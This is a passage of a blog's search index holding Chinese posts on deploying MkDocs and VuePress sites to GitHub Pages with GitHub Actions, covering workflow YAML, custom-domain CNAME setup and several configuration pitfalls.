\u7ed9\u51fa\u7684\u6e32\u67d3\u95ee\u9898\u89e3\u51b3\u65b9\u6848 fetch-depth : 0 - uses : actions/setup-python@v2 with : python-version : 3.x - run : pip install mkdocs - run : pip install mkdocs-material - run : pip install mkdocs-blogging-plugin # \u8bb0\u5f97\u5b89\u88c5\u5176\u4ed6\u4f9d\u8d56\u7684\u5e93 - run : mkdocs gh-deploy --force \u8fd9\u4e2a\u65f6\u5019\u4f60\u5c31\u53ef\u4ee5\u5728 Actions \u9875\u9762\u70b9 Start commit \u4e86\u3002\u53ea\u8981\u4f60\u7684\u672c\u5730\u90e8\u7f72\u53ef\u4ee5\u901a\u8fc7\uff0c\u5728 Actions \u4e0a\u5e94\u8be5\u4e5f\u662f\u53ef\u4ee5\u901a\u8fc7\u7684\u3002 \u5982\u679c Actions \u7684 build \u6216\u8005 deploy \u9636\u6bb5\u51fa\u73b0\u4e86\u95ee\u9898\uff0c\u8bf4\u660e\u53ef\u80fd\u662f\u90a3\u51e0\u4e2a run \u91cc\u51fa\u73b0\u4e86\u9519\u8bef\uff0c\u90a3\u4f60\u5e94\u8be5\u5728\u672c\u5730\u8bd5\u4e00\u4e0b\uff1a \u662f\u4e0d\u662f\u6709\u5305\u5fd8\u4e86 pip install \uff1f \u672c\u5730\u80fd\u6b63\u5e38 mkdocs build \u561b\uff1f \u4e4b\u524d\u9047\u5230\u4e86\u4e00\u4e2a\u5178\u578b\u7684\u95ee\u9898\u5bfc\u81f4 build \u5931\u8d25\uff1a \u6ce8\u610f\u6709\u5751 mkdocs-blogging-plugin \u7684\u5b98\u7f51 \u6587\u6863 \u91cc\u8bf4\uff0c\u8981\u5728 blogging \u91cc\u5efa\u4e00\u4e2a locale: zh-CN \u6765\u8bbe\u7f6e\u65f6\u95f4\u683c\u5f0f\uff0c\u4f46\u662f\u5b9e\u9645\u8fd9\u6837\u505a\u4f1a\u62a5\u9519\uff1a ValueError: expected only letters, got 'zh-cn' \uff0c \u89e3\u51b3\u65b9\u6cd5\uff1a\u4e0d\u8981\u5199 locale: zh-CN \uff0c\u8981\u5199 locale: zh_CN \u6216\u8005\u5e72\u8106\u5199 locale: zh mkdocs.yml 1 2 3 plugins : - blogging : locale : zh_CN \u5751\u8fd8\u6ca1\u7ed3\u675f\uff0c\u7ee7\u7eed\u5f80\u4e0b\u770b","title":"\u5728 GitHub \u4e0a\u521b\u5efa Actions \u4efb\u52a1"},{"location":"blog/2022/220407-github-pages/#pages","text":"\u4f60\u4ee5\u4e3a\u8fd9\u6837\u5c31\u7ed3\u675f\u4e86\uff1f \u8fd8\u6ca1\u6709\uff01 Actions \u7ed3\u675f\u540e\u4f1a\u7ed9\u4f60\u4e00\u4e2a\u9875\u9762\uff08\u5f53\u7136\u4e5f\u53ef\u4ee5\u81ea\u5df1\u53bb\u627e\uff09\uff0c\u4f60\u70b9\u5f00\u8fd9\u4e2a\u9875\u9762\u4f1a\u76f4\u63a5\u544a\u8bc9\u4f60 404 \u3002 \u8fd9\u662f\u56e0\u4e3a\u4f60\u8fd8\u6ca1\u6709\u4e3a Pages \u6307\u5b9a\u5177\u4f53\u7684\u9875\u9762\u3002 \u5c0f\u63d0\u793a \u8fd9\u91cc\u7b80\u5355\u8bf4\u4e00\u4e0b\uff0c\u5f88\u591a\u4eba\u8ba4\u4e3a Actions \u548c Pages \u662f\u4e00\u4e2a\u4e1c\u897f\uff0c\u56e0\u4e3a\u5f88\u591a\u4eba\u7ecf\u5e38\u7528\u8fd9\u4fe9\u4e00\u8d77\u6765\u90e8\u7f72\u9875\u9762\u3002\u4f46\u662f\u5176\u5b9e\u8fd9\u4fe9\u7684\u529f\u80fd\u662f\u5404\u6709\u5206\u5de5\u3002 - Actions \u7684\u4e3b\u8981\u529f\u80fd\u662f\u7f16\u8bd1\uff0c\u5c31\u662f\u4f60\u6307\u5b9a\u4e00\u4e2a\u73af\u5883\uff0c\u7ed9\u51fa\u4e00\u4e9b\u7f16\u8bd1\u4e2d\u8981\u6267\u884c\u7684\u547d\u4ee4\u884c\uff0c\u7136\u540e\u7ed9\u51fa\u4f60\u7684\u6e90\u4ee3\u7801\uff08\u8fd9\u91cc\u7684\u6e90\u4ee3\u7801 GitHub \u4f1a\u81ea\u52a8\u4ece\u4f60\u7684 repo \u91cc\u83b7\u53d6\u6240\u4ee5\u4e0d\u7528\u7ba1\uff09\uff0cGitHub Actions \u5c31\u4f1a\u4ece\u6e90\u4ee3\u7801\u91cc\u7f16\u8bd1\u51fa\u5bf9\u5e94\u7684\u9759\u6001\u6587\u4ef6\uff0c\u8fd9\u4e9b\u9759\u6001\u6587\u4ef6\u53ef\u80fd\u662f\u5404\u79cd\u6587\u4ef6\uff0c\u6bd4\u5982\u4e8c\u8fdb\u5236\u6587\u4ef6\uff0c\u6216\u8005\u662f\u7f51\u9875\u3002 - Pages \u7684\u4e3b\u8981\u529f\u80fd\u662f\u5728 <user>.github.io \u4e0a\u90e8\u7f72\u7f51\u9875\u3002 Actions \u6bd5\u7adf\u53ea\u662f Actions\uff0c\u4ed6\u53c8\u4e0d\u662f\u548c Pages \u8054\u52a8\u7684\uff0c\u6240\u4ee5\u4f60\u5c31\u7b97 Actions \u7f16\u8bd1\u51fa\u4e86\u7f51\u9875\u4e5f\u662f\u4e0d\u4f1a\u7ed9\u4f60\u81ea\u52a8\u90e8\u7f72\u5230 Pages \u4e0a\u7684\u3002 \u63a5\u4e0b\u6765\u624b\u52a8\u8bbe\u7f6e Pages\uff1a graph LR A[\u6253\u5f00\u4f60\u7684\u9879\u76ee\u4ed3\u5e93] --> B; B[Settings] --> C; C[Pages] --> D[Source]; \u9009\u62e9\u5206\u652f\u4e3a gh-pages \uff0c\u8fd9\u662f Actions \u81ea\u52a8\u6784\u5efa\u7684\u6587\u4ef6\u6240\u5b58\u653e\u7684\u5206\u652f\uff0c\u76ee\u5f55\u9009\u62e9 / \u3002 \u70b9 save \uff0c\u8fd9\u4e0b\u662f\u771f\u6ca1\u95ee\u9898\u4e86\u3002","title":"\u8bbe\u7f6e Pages"},{"location":"blog/2022/220407-github-pages/#_2","text":"\u4f7f\u7528\u81ea\u5b9a\u4e49\u57df\u540d\u53c8\u4f1a\u5e26\u6765\u4e24\u4e2a\u5751\uff0c\u65e0\u8bed\u3002 \u9996\u5148\u4f60\u5728\u8bbe\u7f6e Source \u7684\u65f6\u5019\uff0c\u80fd\u770b\u5230\u4e0b\u9762\u4e00\u680f\u662f Custom domain \uff0c\u8fd9\u4e2a\u5c31\u662f\u8bbe\u7f6e\u81ea\u5b9a\u4e49\u57df\u540d\u7684\u5730\u65b9\uff0c\u6bd4\u5982\u6211\u8fd9\u4e2a\u535a\u5ba2\u6784\u5efa\u5728\u4e86 https://zhanbao2000.github.io/blog \uff0c\u4f46\u662f\u6211\u60f3\u8ba9 https://blog.arisa.moe/ \u6307\u5411\u8fd9\u4e2a\u535a\u5ba2\uff0c\u5c31\u5f97\u4fee\u6539\u8fd9\u73a9\u610f\u3002 \u5c0f\u63d0\u793a \u73b0\u5728\u8bbf\u95ee https://zhanbao2000.github.io/blog \u4f1a\u88ab 301 \u91cd\u5b9a\u5411\u5230 https://blog.arisa.moe/ \u76f4\u63a5\u5728\u6846\u6846\u91cc\u5199\u4f60\u7684\u57df\u540d\u80af\u5b9a\u662f\u4e0d\u884c\u7684\uff0c\u5e94\u8be5\u9075\u5faa\u4ee5\u4e0b\u6b65\u9aa4\uff0c\u4ee5\u672c\u7ad9\u4e3a\u4f8b\uff1a \u627e\u5230\u4f60\u57df\u540d\u7684 DNS \u670d\u52a1\u5546\uff0c\u6dfb\u52a0\u4e00\u4e2a CNAME \u8bb0\u5f55\uff1a blog.arisa.moe. 1 IN CNAME zhanbao2000.github.io. \u5728\u521a\u521a\u90a3\u4e2a\u6846\u91cc\u8f93\u5165 blog.arisa.moe \uff0c\u70b9 save \u3002 \u8fc7\u4e00\u4f1a\u5c31\u597d\u4e86\u3002 \u4f60\u4ee5\u4e3a\u8fd9\u6837\u5c31\u5b8c\u4e86\uff1f \u6ce8\u610f\u6709\u5751 \u5982\u679c\u4f60\u4ee5\u4e3a\u8fd9\u6837\u5c31\u5b8c\u4e86\uff0c\u7b49\u4f60\u4e0b\u6b21\u518d\u901a\u8fc7 git push \u63d0\u4ea4\u6587\u6863/\u535a\u5ba2\u7684\u65f6\u5019\uff0c\u4f60\u5c31\u4f1a\u53d1\u73b0\u4f60\u7684\u81ea\u5b9a\u4e49\u57df\u540d\u5df2\u7ecf\u53d8\u6210 404 \u4e86\u3002 \u6b64\u65f6\u4f60\u6253\u5f00 GitHub \u5bf9\u5e94\u4ed3\u5e93\u7684 Settings \u4e00\u770b\uff0c\u597d\u5bb6\u4f19\uff0c\u6846\u6846\u91cc\u4ec0\u4e48\u90fd\u6ca1\u6709\u4e86\u3002 \u5148\u8bf4\u89e3\u51b3\u65b9\u6cd5\u518d\u8bf4\u539f\u56e0\u3002 \u89e3\u51b3\u65b9\u6cd5\u662f\uff0c\u5728 docs \u6587\u4ef6\u5939\u91cc\u521b\u5efa\u4e00\u4e2a CNAME \u6587\u4ef6\uff0c\u5185\u5bb9\u5199\u4e0a\u4f60\u7684\u81ea\u5b9a\u4e49\u57df\u540d\uff0c\u4e0b\u6b21 Actions \u8fd0\u884c\u7684\u65f6\u5019\uff0cPages \u5c31\u4f1a\u81ea\u52a8\u628a\u8fd9\u4e2a\u57df\u540d\u8bbe\u7f6e\u6210\u81ea\u5b9a\u4e49\u57df\u540d\u4e86\u3002 \u53c2\u8003\u4ee5\u4e0b\uff1a Deploying seems to overwrite custom domain #213 gh-pages -d dist overwrites custom domain #127 MkDocs - Custom Domains \ud83d\udc49 \u5176\u5b9e MkDocs \u5b98\u7f51\u6709\u5199 \u8fd9\u4e9b issues \u65e0\u4e00\u4f8b\u5916\u90fd\u63d0\u5230\u4e86\u8981\u521b\u5efa\u4e00\u4e2a CNAME \u6587\u4ef6\u6765\u6307\u793a\u81ea\u5df1\u7684\u81ea\u5b9a\u4e49\u57df\u540d\u3002\u4f46\u662f\u8ddd\u79bb issue \u63d0\u51fa\u597d\u50cf\u5df2\u7ecf\u8fc7\u4e865\u5e74\u4e86\u4e5f\u6ca1\u89c1\u5230 GitHub \u5b98\u65b9\u4fee\u590d\u8fd9\u4e2a\u95ee\u9898\u3002 \u6211\u81ea\u5df1\u63a8\u6d4b\u7684\u539f\u56e0\u662f\u8fd9\u6837\u7684\uff1a \u5728 Pages \u9875\u9762\u8bbe\u7f6e\u81ea\u5b9a\u4e49\u57df\u540d\u7684\u65f6\u5019\uff0c\u5b9e\u9645\u4e0a\u662f\u5728\u9879\u76ee\u751f\u6210\u76ee\u5f55\u91cc\u81ea\u52a8\u521b\u5efa\u4e86\u4e00\u4e2a CNAME \u6587\u4ef6\u7684\uff0c\u548c\u6211\u4eec\u624b\u52a8\u521b\u5efa\u7684\u6548\u679c\u4e00\u6837\u3002\u4f46\u662f\u5728 Actions \u8fd0\u4f5c\u7684\u65f6\u5019\uff0c\u4f1a\u8986\u76d6\u6389\u6574\u4e2a\u9879\u76ee\u751f\u6210\u76ee\u5f55\uff0c\u5305\u62ec\u8fd9\u4e2a CNAME \u6587\u4ef6\u3002 \u90a3\u4e48\u5c31\u6709\u4e24\u4e2a\u529e\u6cd5\u6765\u89e3\u51b3\uff1a \u6bcf\u6b21 Actions \u7ed3\u675f\u4e4b\u540e\uff0c\u624b\u52a8\u53bb Pages \u9875\u9762\u6dfb\u52a0\u81ea\u5b9a\u4e49\u57df\u540d\u3002 \u8ba9 Actions \u7ed3\u675f\u4e4b\u540e\uff0c\u9879\u76ee\u751f\u6210\u76ee\u5f55\u91cc\u59cb\u7ec8\u6709\u8fd9\u4e2a CNAME \u6587\u4ef6\u3002 \u4e8e\u662f\u6211\u4eec\u9009\u62e9\u4e86\u540e\u8005\u3002","title":"\uff08\u53ef\u9009\uff09\u4f7f\u7528\u81ea\u5b9a\u4e49\u57df\u540d"},{"location":"blog/2022/220408-github-pages-2/","tags":["github actions","github pages","vuepress"],"text":"\u4e0a\u4e00\u7bc7\u535a\u5ba2\u8bf4\u5230\u4e86 MkDocs \u90e8\u7f72\u9047\u5230\u7684\u5751\uff0c\u8fd9\u7bc7\u6587\u7ae0\u6765\u8bf4\u8bf4 VuePress \u7684\u90e8\u7f72\u3002 \u6ce8\u610f \u6211\u4f7f\u7528\u7684\u662f VuePress v1.x \uff0c\u8de8\u7248\u672c\u51fa\u73b0\u7684\u5751\u672c\u4eba\u4e00\u6982\u4e0d\u77e5\u3002 \u672c\u5730\u90e8\u7f72\u6d4b\u8bd5 \u00b6 \u9996\u5148\u540c\u6837\u662f\u672c\u5730\u90e8\u7f72 npm yarn npm run docs:build yarn docs:build \u8981\u662f\u672c\u5730\u7f16\u8bd1\u90fd\u6ca1\u6cd5\u901a\u8fc7\uff0c\u90a3\u5c31\u522b\u7ee7\u7eed\u4e86\u3002 \u5728 GitHub \u4e0a\u521b\u5efa Actions \u4efb\u52a1 \u00b6 \u8ba9\u6211\u4eec\u8df3\u8fc7\u521b\u5efa\u672c\u5730 VCS \u5e76\u548c GitHub \u5173\u8054\u7684\u6b65\u9aa4\uff0c\u56e0\u4e3a\u4e0a\u4e00\u7bc7\u535a\u5ba2\u5df2\u7ecf\u8bf4\u7684\u5f88\u660e\u786e\u4e86\uff0c\u8fd9\u7bc7\u535a\u5ba2\u6211\u4eec\u76f4\u63a5\u4ece yml \u6587\u4ef6\u600e\u4e48\u5199\u5f00\u59cb\u8bf4\u8d77\u3002 \u540c\u6837\u662f\u53bb\u627e\u5b98\u65b9\u6587\u6863\uff0c\u6ce8\u610f 1.x \u548c 2.x \u7684\u6587\u6863\u6709\u6240\u4e0d\u540c\u3002 1.x 2.x\uff08\u4ec5\u505a\u793a\u8303\uff0c\u4e0d\u6807\u6ce8\uff09 main.yml\uff08\u8bf7\u52ff\u76f4\u63a5\u4f7f\u7528\uff09 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 name : Build and Deploy on : [ push ] jobs : build-and-deploy : runs-on : ubuntu-latest steps : - name : Checkout uses : actions/checkout@master - name : vuepress-deploy uses : jenkey2011/vuepress-deploy@master env : ACCESS_TOKEN : ${{ secrets.ACCESS_TOKEN }} TARGET_REPO : username/repo TARGET_BRANCH : master BUILD_SCRIPT : yarn && yarn build BUILD_DIR : docs/.vuepress/dist CNAME : https://www.xxx.com main.yml\uff08\u8bf7\u52ff\u76f4\u63a5\u4f7f\u7528\uff09 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 name : docs on : # \u6bcf\u5f53 push \u5230 main \u5206\u652f\u65f6\u89e6\u53d1\u90e8\u7f72 push : branches : [ main ] # \u624b\u52a8\u89e6\u53d1\u90e8\u7f72 workflow_dispatch : jobs : docs : runs-on : ubuntu-latest steps : - uses : actions/checkout@v2 with : # \u201c\u6700\u8fd1\u66f4\u65b0\u65f6\u95f4\u201d \u7b49 git \u65e5\u5fd7\u76f8\u5173\u4fe1\u606f\uff0c\u9700\u8981\u62c9\u53d6\u5168\u90e8\u63d0\u4ea4\u8bb0\u5f55 fetch-depth : 0 - name : Setup Node.js uses : actions/setup-node@v1 with : # \u9009\u62e9\u8981\u4f7f\u7528\u7684 node \u7248\u672c node-version : '14' # \u7f13\u5b58 node_modules - name : Cache dependencies uses : actions/cache@v2 id : yarn-cache with : path : | **/node_modules key : ${{ runner.os }}-yarn-${{ hashFiles('**/yarn.lock') }} restore-keys : | ${{ runner.os }}-yarn- # \u5982\u679c\u7f13\u5b58\u6ca1\u6709\u547d\u4e2d\uff0c\u5b89\u88c5\u4f9d\u8d56 - name : Install dependencies if : steps.yarn-cache.outputs.cache-hit != 'true' run : yarn --frozen-lockfile # \u8fd0\u884c\u6784\u5efa\u811a\u672c - name : Build VuePress site run : yarn docs:build # \u67e5\u770b workflow \u7684\u6587\u6863\u6765\u83b7\u53d6\u66f4\u591a\u4fe1\u606f # @see https://github.com/crazy-max/ghaction-github-pages - name : Deploy to GitHub Pages uses : crazy-max/ghaction-github-pages@v2 with : # \u90e8\u7f72\u5230 gh-pages \u5206\u652f target_branch : gh-pages # \u90e8\u7f72\u76ee\u5f55\u4e3a VuePress \u7684\u9ed8\u8ba4\u8f93\u51fa\u76ee\u5f55 build_dir : docs/.vuepress/dist env : # @see https://docs.github.com/cn/actions/reference/authentication-in-a-workflow#about-the-github_token-secret GITHUB_TOKEN : ${{ secrets.GITHUB_TOKEN }} \u6ce8\u610f\u6709\u5751 \u4e0a\u9762\u6807\u6ce8\u7684\u5730\u65b9\uff0c\u770b\u5230\u6ca1\u6709\uff1f\u5168\u90fd\u662f\u5751\uff01 \u5c24\u5176\u662f\u7b2c15\u884c\u8fd9\u4e2a TARGET_BRANCH : master \uff0c\u7b80\u76f4\u662f\u4e00\u952e\u5220\u5e93\u8dd1\u8def\u7ea7\u522b\u7684\u5751\u3002 \u9996\u5148\u8bf4\u4e0b15\u884c\u8fd9\u4e2a\u3002 TARGET_BRANCH \u7684\u610f\u601d\u662f\uff0c\u6307\u5b9a build \u51fa\u6765\u7684 HTML \u9875\u9762\u5b58\u653e\u7684\u5206\u652f\uff0c\u800c\u4e0d\u662f\u6307\u5b9a markdown \u6587\u4ef6\u5b58\u653e\u7684\u5206\u652f\u3002\u5f53\u521d\u5c31\u88ab\u8fd9\u4e2a\u4e1c\u897f\u5751\u4e86\uff0c\u4ee5\u4e3a\u662f\u4ece TARGET_BRANCH \u8fd9\u4e2a\u5206\u652f\u83b7\u53d6 markdown\uff0c\u6211\u5c31\u8bbe\u7f6e\u7684\u9ed8\u8ba4\u7684 master \uff0c\u7ed3\u679c\u4ed6\u628a\u751f\u6210\u7684 HTML \u5168\u90e8\u7ed9 rebase \u5230\u6211\u7684 master \u5206\u652f\u4e86\u3002\u597d\u4e86\uff0c\u6211\u5199\u7684 markdown \u88ab\u5168\u90e8\u8986\u76d6\u4e86\u3002 \u6b63\u786e\u7684\u505a\u6cd5\u662f\uff1a TARGET_BRANCH : gh-pages \u8fd9\u6837\u4ed6\u5c31\u4f1a\u628a\u751f\u6210\u7684 HTML \u5b58\u653e\u5230 gh-pages \u5206\u652f\uff0c\u8fd9\u4e5f\u662f\u5927\u591a\u6570\u81ea\u52a8\u5316 Pages \u5e94\u7528\uff08\u6bd4\u5982 MkDocs \uff09\u751f\u6210\u7684\u9875\u9762\u6240\u5728\u5206\u652f\u3002 \u7136\u540e\u662f16\u884c\u8fd9\u4e2a BUILD_SCRIPT : yarn && yarn build \u3002 \u4f60\u8fd9\u548b build\uff1f \u6539\u6210\uff1a BUILD_SCRIPT : yarn && yarn docs:build \u7136\u540e\u662f18\u884c\u8fd9\u4e2a CNAME \uff0c\u8fd9\u4e2a\u5df2\u7ecf\u5728\u4e0a\u4e00\u7bc7\u535a\u5ba2\u91cc\u63d0\u5230\u4e86\uff0c\u5c31\u662f\u7528\u6765\u81ea\u52a8\u8bbe\u7f6e\u81ea\u5b9a\u4e49\u57df\u540d\u7684\uff0c\u8fd9\u91cc\u6539\u6210\u4f60\u60f3\u8981\u7684\u57df\u540d\u5c31\u53ef\u4ee5\u4e86\u3002\u6ca1\u4ec0\u4e48\u5927\u5751\u3002 \u6700\u540e\u6539\u4e00\u4e0b TARGET_REPO : username/repo \uff0c\u6307\u5411\u4f60\u81ea\u5df1\u7684 repo\uff0c\u8fd9\u91cc\u4ee5\u6211\u7684 mokabot2 \u4e3a\u4f8b\u3002 \u6700\u7ec8\u7684\u6210\u54c1\u5e94\u8be5\u662f\u8fd9\u6837\u7684\uff1a main.yml 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 name : Build and Deploy on : [ push ] jobs : build-and-deploy : runs-on : ubuntu-latest steps : - name : Checkout uses : actions/checkout@master - name : vuepress-deploy uses : jenkey2011/vuepress-deploy@master env : ACCESS_TOKEN : ${{ secrets.ACCESS_TOKEN }} TARGET_REPO : MokaDevelopers/mokabot2 TARGET_BRANCH : gh-pages BUILD_SCRIPT : yarn && yarn docs:build BUILD_DIR : docs/.vuepress/dist CNAME : docs-mokabot.arisa.moe \u4f46\u662f\u5148\u4e0d\u8981\u63d0\u4ea4\uff0c\u8bbe\u7f6e\u597d\u5bc6\u94a5\u4e4b\u540e\u518d\u63d0\u4ea4\uff0c\u8fd9\u4e2a\u5bc6\u94a5\u662f\u63d0\u4f9b\u7ed9 vuepress-deploy \u5e94\u7528\u6765\u4f7f\u7528\u7684\u3002 \u8bbe\u7f6e\u5bc6\u94a5 \u00b6 \u8fd9\u4e00\u6b65\u5fc5\u4e0d\u53ef\u5c11\uff0c\u4e0d\u7136\u5373\u4f7f Actions \u53ef\u4ee5\u751f\u6210\uff0c\u4f46\u662f vuepress-deploy \u6ca1\u6cd5\u90e8\u7f72\u5230\u4f60\u7684 gh-pages \u5206\u652f\u91cc\u3002 \u770b\u8fd9\u4e2a \u6587\u6863 \u5c31\u884c\u3002 \u8bbe\u7f6e\u597d\u5bc6\u94a5\u4e4b\u540e\u5c31\u53ef\u4ee5\u63d0\u4ea4\u90a3\u4e2a yml \u6587\u4ef6\u4e86\u3002 \u5b8c\u6210 \u00b6 \u8bbe\u7f6e\u5b8c\u8fd9\u4e9b\u4e4b\u540e\uff0c\u5c31\u53ef\u4ee5\u6b63\u5e38\u901a\u8fc7 push \u64cd\u4f5c\u89e6\u53d1 Actions \u6d41\u7a0b\u81ea\u52a8\u6784\u5efa\u6587\u6863\u4e86\u3002","title":"GitHub Pages \u6587\u6863\u81ea\u52a8\u5316\u90e8\u7f72 - VuePress"},{"location":"blog/2022/220408-github-pages-2/#_1","text":"\u9996\u5148\u540c\u6837\u662f\u672c\u5730\u90e8\u7f72 npm yarn npm run docs:build yarn docs:build \u8981\u662f\u672c\u5730\u7f16\u8bd1\u90fd\u6ca1\u6cd5\u901a\u8fc7\uff0c\u90a3\u5c31\u522b\u7ee7\u7eed\u4e86\u3002","title":"\u672c\u5730\u90e8\u7f72\u6d4b\u8bd5"},{"location":"blog/2022/220408-github-pages-2/#github-actions","text":"\u8ba9\u6211\u4eec\u8df3\u8fc7\u521b\u5efa\u672c\u5730 VCS \u5e76\u548c GitHub \u5173\u8054\u7684\u6b65\u9aa4\uff0c\u56e0\u4e3a\u4e0a\u4e00\u7bc7\u535a\u5ba2\u5df2\u7ecf\u8bf4\u7684\u5f88\u660e\u786e\u4e86\uff0c\u8fd9\u7bc7\u535a\u5ba2\u6211\u4eec\u76f4\u63a5\u4ece yml \u6587\u4ef6\u600e\u4e48\u5199\u5f00\u59cb\u8bf4\u8d77\u3002 \u540c\u6837\u662f\u53bb\u627e\u5b98\u65b9\u6587\u6863\uff0c\u6ce8\u610f 1.x \u548c 2.x \u7684\u6587\u6863\u6709\u6240\u4e0d\u540c\u3002 1.x 2.x\uff08\u4ec5\u505a\u793a\u8303\uff0c\u4e0d\u6807\u6ce8\uff09 main.yml\uff08\u8bf7\u52ff\u76f4\u63a5\u4f7f\u7528\uff09 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 name : Build and Deploy on : [ push ] jobs : build-and-deploy : runs-on : ubuntu-latest steps : - name : Checkout uses : actions/checkout@master - name : vuepress-deploy uses : jenkey2011/vuepress-deploy@master env : ACCESS_TOKEN : ${{ secrets.ACCESS_TOKEN }} TARGET_REPO : username/repo TARGET_BRANCH : master BUILD_SCRIPT : yarn && yarn build BUILD_DIR : docs/.vuepress/dist CNAME : https://www.xxx.com main.yml\uff08\u8bf7\u52ff\u76f4\u63a5\u4f7f\u7528\uff09 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 name : docs on : # \u6bcf\u5f53 push \u5230 main \u5206\u652f\u65f6\u89e6\u53d1\u90e8\u7f72 push : branches : [ main ] # \u624b\u52a8\u89e6\u53d1\u90e8\u7f72 workflow_dispatch : jobs : docs : runs-on : ubuntu-latest steps : - uses : actions/checkout@v2 with : # \u201c\u6700\u8fd1\u66f4\u65b0\u65f6\u95f4\u201d \u7b49 git \u65e5\u5fd7\u76f8\u5173\u4fe1\u606f\uff0c\u9700\u8981\u62c9\u53d6\u5168\u90e8\u63d0\u4ea4\u8bb0\u5f55 fetch-depth : 0 - name : Setup Node.js uses : actions/setup-node@v1 with : # \u9009\u62e9\u8981\u4f7f\u7528\u7684 node \u7248\u672c node-version : '14' # \u7f13\u5b58 node_modules - name : Cache dependencies uses : actions/cache@v2 id : yarn-cache with : path : | **/node_modules key : ${{ runner.os }}-yarn-${{ hashFiles('**/yarn.lock') }} restore-keys : | ${{ runner.os }}-yarn- # \u5982\u679c\u7f13\u5b58\u6ca1\u6709\u547d\u4e2d\uff0c\u5b89\u88c5\u4f9d\u8d56 - name : Install dependencies if : steps.yarn-cache.outputs.cache-hit != 'true' run : yarn --frozen-lockfile # \u8fd0\u884c\u6784\u5efa\u811a\u672c - name : Build VuePress site run : yarn docs:build # \u67e5\u770b workflow \u7684\u6587\u6863\u6765\u83b7\u53d6\u66f4\u591a\u4fe1\u606f # @see https://github.com/crazy-max/ghaction-github-pages - name : Deploy to GitHub Pages uses : crazy-max/ghaction-github-pages@v2 with : # \u90e8\u7f72\u5230 gh-pages \u5206\u652f target_branch : gh-pages # \u90e8\u7f72\u76ee\u5f55\u4e3a VuePress \u7684\u9ed8\u8ba4\u8f93\u51fa\u76ee\u5f55 build_dir : docs/.vuepress/dist env : # @see https://docs.github.com/cn/actions/reference/authentication-in-a-workflow#about-the-github_token-secret GITHUB_TOKEN : ${{ secrets.GITHUB_TOKEN }} \u6ce8\u610f\u6709\u5751 \u4e0a\u9762\u6807\u6ce8\u7684\u5730\u65b9\uff0c\u770b\u5230\u6ca1\u6709\uff1f\u5168\u90fd\u662f\u5751\uff01 \u5c24\u5176\u662f\u7b2c15\u884c\u8fd9\u4e2a TARGET_BRANCH : master \uff0c\u7b80\u76f4\u662f\u4e00\u952e\u5220\u5e93\u8dd1\u8def\u7ea7\u522b\u7684\u5751\u3002 \u9996\u5148\u8bf4\u4e0b15\u884c\u8fd9\u4e2a\u3002 TARGET_BRANCH \u7684\u610f\u601d\u662f\uff0c\u6307\u5b9a build \u51fa\u6765\u7684 HTML \u9875\u9762\u5b58\u653e\u7684\u5206\u652f\uff0c\u800c\u4e0d\u662f\u6307\u5b9a markdown \u6587\u4ef6\u5b58\u653e\u7684\u5206\u652f\u3002\u5f53\u521d\u5c31\u88ab\u8fd9\u4e2a\u4e1c\u897f\u5751\u4e86\uff0c\u4ee5\u4e3a\u662f\u4ece TARGET_BRANCH \u8fd9\u4e2a\u5206\u652f\u83b7\u53d6 markdown\uff0c\u6211\u5c31\u8bbe\u7f6e\u7684\u9ed8\u8ba4\u7684 master \uff0c\u7ed3\u679c\u4ed6\u628a\u751f\u6210\u7684 HTML \u5168\u90e8\u7ed9 rebase \u5230\u6211\u7684 master \u5206\u652f\u4e86\u3002\u597d\u4e86\uff0c\u6211\u5199\u7684 markdown \u88ab\u5168\u90e8\u8986\u76d6\u4e86\u3002 \u6b63\u786e\u7684\u505a\u6cd5\u662f\uff1a TARGET_BRANCH : gh-pages \u8fd9\u6837\u4ed6\u5c31\u4f1a\u628a\u751f\u6210\u7684 HTML \u5b58\u653e\u5230 gh-pages \u5206\u652f\uff0c\u8fd9\u4e5f\u662f\u5927\u591a\u6570\u81ea\u52a8\u5316 Pages \u5e94\u7528\uff08\u6bd4\u5982 MkDocs \uff09\u751f\u6210\u7684\u9875\u9762\u6240\u5728\u5206\u652f\u3002 \u7136\u540e\u662f16\u884c\u8fd9\u4e2a BUILD_SCRIPT : yarn && yarn build \u3002 \u4f60\u8fd9\u548b build\uff1f \u6539\u6210\uff1a BUILD_SCRIPT : yarn && yarn docs:build \u7136\u540e\u662f18\u884c\u8fd9\u4e2a CNAME \uff0c\u8fd9\u4e2a\u5df2\u7ecf\u5728\u4e0a\u4e00\u7bc7\u535a\u5ba2\u91cc\u63d0\u5230\u4e86\uff0c\u5c31\u662f\u7528\u6765\u81ea\u52a8\u8bbe\u7f6e\u81ea\u5b9a\u4e49\u57df\u540d\u7684\uff0c\u8fd9\u91cc\u6539\u6210\u4f60\u60f3\u8981\u7684\u57df\u540d\u5c31\u53ef\u4ee5\u4e86\u3002\u6ca1\u4ec0\u4e48\u5927\u5751\u3002 \u6700\u540e\u6539\u4e00\u4e0b TARGET_REPO : username/repo \uff0c\u6307\u5411\u4f60\u81ea\u5df1\u7684 repo\uff0c\u8fd9\u91cc\u4ee5\u6211\u7684 mokabot2 \u4e3a\u4f8b\u3002 \u6700\u7ec8\u7684\u6210\u54c1\u5e94\u8be5\u662f\u8fd9\u6837\u7684\uff1a main.yml 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 name : Build and Deploy on : [ push ] jobs : build-and-deploy : runs-on : ubuntu-latest steps : - name : Checkout uses : actions/checkout@master - name : vuepress-deploy uses : jenkey2011/vuepress-deploy@master env : ACCESS_TOKEN : ${{ secrets.ACCESS_TOKEN }} TARGET_REPO : MokaDevelopers/mokabot2 TARGET_BRANCH : gh-pages BUILD_SCRIPT : yarn && yarn docs:build BUILD_DIR : docs/.vuepress/dist CNAME : docs-mokabot.arisa.moe 